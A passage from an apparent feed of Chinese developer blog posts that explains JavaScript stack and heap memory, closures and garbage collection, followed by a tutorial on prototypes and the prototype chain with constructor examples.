<li>引擎通过垃圾回收机制（如标记-清除算法）自动回收不再被引用的对象。</li>
</ul>
<blockquote>
<p><strong>关键设计思想</strong>：栈负责“轻量级、快速切换”的上下文状态，堆负责“重量级、长期存在”的数据存储。二者协同，既保证执行效率，又支持复杂数据结构。</p>
</blockquote>
<hr/>
<h3 data-id="heading-7">四、执行上下文与作用域链</h3>
<p>每当 JavaScript 执行一段代码（全局代码或函数），引擎会创建一个<strong>执行上下文</strong>，包含：</p>
<ul>
<li><strong>变量环境</strong>：存放 <code>var</code> 声明的变量（函数提升阶段初始化）。</li>
<li><strong>词法环境</strong>：存放 <code>let</code>、<code>const</code> 及函数参数，具有块级作用域。</li>
<li><strong>outer 引用</strong>：指向外层词法环境，构成<strong>词法作用域链</strong>。</li>
<li><strong>this 绑定</strong>：根据调用方式确定。</li>
</ul>
<p>作用域链使得内部函数可以访问外部函数的变量，这是<strong>闭包</strong>的基础。</p>
<hr/>
<h3 data-id="heading-8">五、闭包的内存机制：为什么能“记住”外部变量？</h3>
<p>闭包（Closure）是指<strong>内部函数引用了外部函数的变量，且该内部函数在外部函数执行完毕后仍可被调用</strong>的现象。从内存角度看，闭包的实现依赖于堆内存的特殊处理。</p>
<h4 data-id="heading-9">闭包的执行流程（以 V8 引擎为例）：</h4>
<ol>
<li><strong>编译阶段</strong>：当解析到函数 <code>foo</code> 时，引擎进行词法扫描，发现其内部定义了 <code>getName</code> 和 <code>setName</code> 函数。</li>
<li><strong>变量捕获检测</strong>：引擎检查这些内部函数是否引用了 <code>foo</code> 中的变量（如 <code>myName</code>）。若有，则判定存在闭包。</li>
<li><strong>创建 Closure 对象</strong>：在<strong>堆内存</strong>中为 <code>foo</code> 创建一个特殊的 <code>closure(foo)</code> 对象，用于保存被内部函数引用的<strong>自由变量</strong>（如 <code>myName</code>）。</li>
<li><strong>绑定引用</strong>：<code>getName</code> 和 <code>setName</code> 的词法环境中，<code>outer</code> 指向这个堆中的 <code>closure(foo)</code>，而非原本的栈帧。</li>
<li><strong>函数返回后</strong>：即使 <code>foo</code> 的执行上下文从调用栈弹出（栈内存回收），<code>closure(foo)</code> 仍因被内部函数引用而保留在堆中，直到所有引用消失才被垃圾回收。</li>
</ol>
<blockquote>
<p><strong>关键点</strong>：闭包的本质是<strong>将本应随栈帧销毁的变量，提升到堆中持久化存储</strong>。这打破了“函数执行完即释放局部变量”的常规，但也带来了内存占用增加的风险。</p>
</blockquote>
<hr/>
<h3 data-id="heading-10">六、为什么简单类型放栈、复杂类型放堆？</h3>
<p>这个问题的答案源于计算机体系结构与程序执行效率的权衡：</p>
<ul>
<li><strong>栈的优势</strong>：连续内存、指针偏移即可切换上下文，速度极快。但容量有限，不适合存储大对象。</li>
<li><strong>堆的必要性</strong>：对象大小不确定、生命周期长，需动态分配。虽然管理开销大，但空间几乎无限。</li>
</ul>
<p>若将对象也放入栈中：</p>
<ul>
<li>函数调用时栈帧会变得巨大；</li>
<li>上下文切换成本剧增；</li>
<li>递归或深层调用极易导致栈溢出。</li>
</ul>
<p>因此，JavaScript 引擎采用“<strong>栈存引用，堆存实体</strong>”的策略，既保持执行效率，又支持灵活的数据结构。</p>
<hr/>
<h3 data-id="heading-11">七、内存回收机制</h3>
<ul>
<li>
<p><strong>栈内存</strong>：随函数执行结束自动释放（通过栈顶指针回退）。</p>
</li>
<li>
<p><strong>堆内存</strong>：依赖<strong>垃圾回收器（GC）</strong> 。V8 使用分代式垃圾回收：</p>
<ul>
<li>新生代（小对象，频繁回收）</li>
<li>老生代（长期存活对象，较少回收）</li>
</ul>
</li>
</ul>
<p>当一个对象<strong>没有任何变量或闭包引用它</strong>时，GC 会将其标记为可回收，并在合适时机释放内存。</p>
<blockquote>
<p><strong>注意</strong>：闭包若持有大量数据且未及时解除引用，会导致<strong>内存泄漏</strong>。例如，DOM 事件处理器中使用闭包引用外部大对象，而未在组件卸载时移除监听器。</p>
</blockquote>
<hr/>
<h3 data-id="heading-12">结语</h3>
<p>JavaScript 的内存机制是其高效运行的基石。通过栈与堆的合理分工，引擎在保证执行速度的同时，支持复杂的编程范式如闭包。理解这一机制，不仅能帮助我们写出更高效的代码，还能有效规避内存泄漏等常见问题。作为开发者，虽无需手动管理内存，但“知其所以然”方能游刃有余于现代前端工程的复杂场景之中。</p>
<blockquote>
<p>正如一句老话：“你不需要成为汽车工程师才能开车，但了解引擎原理能让你开得更好。” —— 对 JavaScript 内存机制的理解，正是如此。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[原型-1: 理解 JavaScript 中的 原型]]></title>    <link>https://juejin.cn/post/7581765536373178377</link>    <guid>https://juejin.cn/post/7581765536373178377</guid>    <pubDate>2025-12-10T05:14:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581765536373178377" data-draft-id="7581772744376188974" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="原型-1: 理解 JavaScript 中的 原型"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-10T05:14:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="之恒君"/> <meta itemprop="url" content="https://juejin.cn/user/2261046026312318"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            原型-1: 理解 JavaScript 中的 原型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2261046026312318/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    之恒君
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T05:14:23.000Z" title="Wed Dec 10 2025 05:14:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px}.markdown-body h2{font-size:24px;display:inline-block;font-weight:700;background:#ef7060;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(239,112,96,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 50px);border-bottom:3px solid #ef7060}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #3e3e3e;margin-top:32px;margin-bottom:32px;height:1px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(27,31,35,.05);color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:JetBranins Mono,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px;background-color:#fdfdfd}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#fdfdfd}.markdown-body a{text-decoration:none;font-weight:700;color:#ef7060;border-bottom:1px solid #ef7060}.markdown-body a:active,.markdown-body a:hover{color:#ef2d26}.markdown-body table tr td,.markdown-body table tr th{border:1px solid #ccc;padding:5px 10px}.markdown-body table{display:block!important;width:auto;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{background:#f0f0f0;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#f8f8f8}.markdown-body blockquote{margin-inline-start:0;margin-inline-end:0;border-left:3px solid #ef7060;background:#fff9f9;padding:1px 20px;margin-top:20px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-heath-light">.hljs-comment,.hljs-quote{color:#776977}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ca402b}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#a65926}.hljs-bullet,.hljs-string,.hljs-symbol{color:#918b3b}.hljs-section,.hljs-title{color:#516aec}.hljs-keyword,.hljs-selector-tag{color:#7b59c0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#f7f3f7;color:#695d69}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>要理解 JavaScript 中的「原型」，首先要跳出其他面向对象语言（如 Java、C#）的「类」思维——JS 是通过 <strong>原型（Prototype）</strong> 实现继承和属性共享的，核心是「对象基于原型关联，而非类的实例化」。</p>
<h3 data-id="heading-0">一、先搞懂：为什么需要原型？</h3>
<p>原型的本质是 <strong>“资源复用工具”</strong> 。它解决了一个核心问题：<strong>避免重复创建相同属性/方法，节省内存</strong>。</p>
<p>举个例子：如果创建 100 个「人」对象，每个对象都需要 <code>sayHello</code> 方法。如果直接在每个对象里定义 <code>sayHello</code>，会生成 100 个完全相同的函数，造成内存浪费。</p>
<p>而原型的思路是：<strong>把</strong> <code>sayHello</code> <strong>放在一个“公共模板”（原型对象）里，所有「人」对象都“关联”这个模板，需要时直接从模板里拿方法</strong>——这样只需要 1 个 <code>sayHello</code> 函数，实现资源复用。</p>
<h3 data-id="heading-1">二、核心概念：3 个关键角色</h3>
<p>理解原型，必须先分清 3 个紧密关联的概念：<strong>原型对象（Prototype）</strong> 、<code>prototype</code> <strong>属性</strong>、<code>__proto__</code> <strong>属性</strong>（或 <code>Object.getPrototypeOf()</code> 方法）。</p>

























<table><thead><tr><th>概念</th><th>作用</th><th>归属</th></tr></thead><tbody><tr><td>原型对象（Prototype）</td><td>存储公共属性/方法的“模板对象”，被其他对象共享</td><td>每个对象都有一个原型对象（除了 <code>Object.prototype</code>）</td></tr><tr><td><code>prototype</code> 属性</td><td><strong>函数特有</strong>，指向该函数创建的「实例对象」的原型对象</td><td>函数（如构造函数、普通函数）</td></tr><tr><td><code>__proto__</code> 属性</td><td><strong>对象特有</strong>，指向该对象的原型对象（非标准，但浏览器普遍支持）</td><td>所有对象（除了 <code>null</code>）</td></tr></tbody></table>
<h3 data-id="heading-2">三、直观理解：原型链的“关联关系”</h3>
<p>所有对象的原型会形成一条「原型链」：对象 → 它的原型对象 → 原型的原型对象 → ... → 最终指向 <code>Object.prototype</code>（原型链的顶端），<code>Object.prototype</code> 的原型是 <code>null</code>（没有更上层的原型）。</p>
<p>我们通过一个具体例子，拆解原型链的关联逻辑：</p>
<h4 data-id="heading-3">1. 用构造函数创建对象（经典场景）</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. 定义一个构造函数（首字母大写，约定用于创建对象）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// 实例属性：每个 Person 实例都有独立的 name</span>
}

<span class="hljs-comment">// 2. 在构造函数的 prototype 上定义“公共方法”</span>
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
};

<span class="hljs-comment">// 3. 用 new 关键字创建 Person 实例</span>
<span class="hljs-keyword">const</span> zhangsan = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'张三'</span>);
</code></pre>
<h4 data-id="heading-4">2. 拆解原型关联（关键！）</h4>
<p>上面代码中，<code>zhangsan</code>、<code>Person</code>、<code>Person.prototype</code> 三者的原型关系如下：</p>
<ul>
<li><code>zhangsan</code> <strong>（实例对象）的原型</strong>：<code>zhangsan.__proto__ === Person.prototype</code>（或 <code>Object.getPrototypeOf(zhangsan) === Person.prototype</code>）<br/>
→ 实例的原型，指向构造函数的 <code>prototype</code> 属性。</li>
<li><code>Person.prototype</code> <strong>（原型对象）的原型</strong>：<code>Person.prototype.__proto__ === Object.prototype</code><br/>
→ 所有自定义原型对象，最终都关联到 <code>Object.prototype</code>（JS 内置的顶层原型）。</li>
<li><code>Object.prototype</code> <strong>的原型</strong>：<code>Object.prototype.__proto__ === null</code><br/>
→ 原型链的终点，没有更上层的原型。</li>
<li><code>Person</code> <strong>（构造函数）的原型</strong>：<code>Person.__proto__ === Function.prototype</code><br/>
→ 函数也是对象，所有函数的原型都指向 <code>Function.prototype</code>（<code>Function.prototype.__proto__</code> 最终也指向 <code>Object.prototype</code>）。</li>
</ul>
<h4 data-id="heading-5">3. 原型链的作用：属性查找规则</h4>
<p>当你访问一个对象的属性（如 <code>zhangsan.sayHello</code>）时，JS 会按以下规则查找：</p>
<ol>
<li>先在对象自身查找：如果 <code>zhangsan</code> 自己有 <code>sayHello</code> 方法，直接使用；</li>
<li>自身没有，就去「对象的原型对象」查找：即 <code>Person.prototype</code>，找到 <code>sayHello</code>，使用；</li>
<li>原型对象没有，就去「原型的原型」查找：即 <code>Object.prototype</code>；</li>
<li>一直查到 <code>null</code> 还没找到，就返回 <code>undefined</code>（不会报错）。</li>
</ol>
<p>比如：<code>zhangsan.toString()</code>（<code>toString</code> 是 <code>Object.prototype</code> 的方法，<code>zhangsan</code> 自身没有，但能通过原型链找到）。</p>
<h3 data-id="heading-6">四、原型的核心特性</h3>
<h4 data-id="heading-7">1. 共享性：原型上的属性/方法被所有实例共享</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> lisi = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'李四'</span>);
zhangsan.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// Hello, I'm 张三</span>
lisi.<span class="hljs-title function_">sayHello</span>();     <span class="hljs-comment">// Hello, I'm 李四</span>
<span class="hljs-comment">// 两个实例调用的是同一个 sayHello 方法（来自 Person.prototype）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zhangsan.<span class="hljs-property">sayHello</span> === lisi.<span class="hljs-property">sayHello</span>); <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-8">2. 动态性：原型的修改会影响所有已创建的实例</h4>
<p>即使实例已经创建，修改原型对象的属性/方法，实例也能立即访问到新的内容：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 给 Person.prototype 新增一个方法</span>
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> is eating`</span>);
};

<span class="hljs-comment">// 已创建的 zhangsan 能直接调用新方法</span>
zhangsan.<span class="hljs-title function_">eat</span>(); <span class="hljs-comment">// 张三 is eating</span>
</code></pre>
<h4 data-id="heading-9">3. 实例可“覆盖”原型属性（不修改原型本身）</h4>
<p>如果实例自身定义了和原型同名的属性/方法，会优先使用实例自身的（原型链查找时会先找到自身属性，停止向上查找）：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 给 zhangsan 自身定义 sayHello 方法</span>
zhangsan.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
};

zhangsan.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// Hi, I'm 张三（用自身的方法）</span>
lisi.<span class="hljs-title function_">sayHello</span>();     <span class="hljs-comment">// Hello, I'm 李四（用原型的方法，不受影响）</span>
</code></pre>
<h3 data-id="heading-10">五、常见误区澄清</h3>
<ol>
<li><strong>“原型是类”？错！</strong><br/>
JS 直到 ES6 才引入 <code>class</code> 语法，但 <code>class</code> 只是「原型的语法糖」——本质还是基于原型实现继承，并非像 Java 那样的“类”。</li>
<li><code>prototype</code> <strong>和</strong> <code>__proto__</code> <strong>分不清？</strong></li>
</ol>
<ul>
<li>
<ul>
<li>记住：<code>prototype</code> 是<strong>函数的属性</strong>，指向实例的原型；<code>__proto__</code> 是<strong>对象的属性</strong>，指向自己的原型。</li>
<li>简单公式：<code>实例.__proto__ === 构造函数.prototype</code>。</li>
</ul>
</li>
</ul>
<ol start="3">
<li><strong>“所有对象都有</strong> <code>__proto__</code> <strong>”？错！</strong><br/>
<code>null</code> 没有 <code>__proto__</code>（<code>Object.getPrototypeOf(null)</code> 会返回 <code>null</code>），它是原型链的终点。</li>
</ol>
<h3 data-id="heading-11">六、总结：原型的本质</h3>
<p>原型的核心是「<strong>对象之间的关联关系</strong>」——每个对象都通过 <code>__proto__</code> 关联到一个原型对象，从而共享原型上的资源。这种关联形成的「原型链」，决定了 JS 中属性查找、继承的逻辑。</p>
<p>理解原型，就能理解 JS 面向对象的底层逻辑（比如 <code>new</code> 关键字的作用、继承的实现方式），也是后续学习 <code>class</code>、<code>extends</code> 等语法的基础。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[原型-2：prototype 和 __proto__ 的区别详解]]></title>    <link>https://juejin.cn/post/7581807793133699118</link>    <guid>https://juejin.cn/post/7581807793133699118</guid>    <pubDate>2025-12-10T05:19:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581807793133699118" data-draft-id="7581888578508537883" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="原型-2：prototype 和 __proto__ 的区别详解"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-10T05:19:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="之恒君"/> <meta itemprop="url" content="https://juejin.cn/user/2261046026312318"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            原型-2：prototype 和 __proto__ 的区别详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2261046026312318/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    之恒君
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T05:19:45.000Z" title="Wed Dec 10 2025 05:19:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
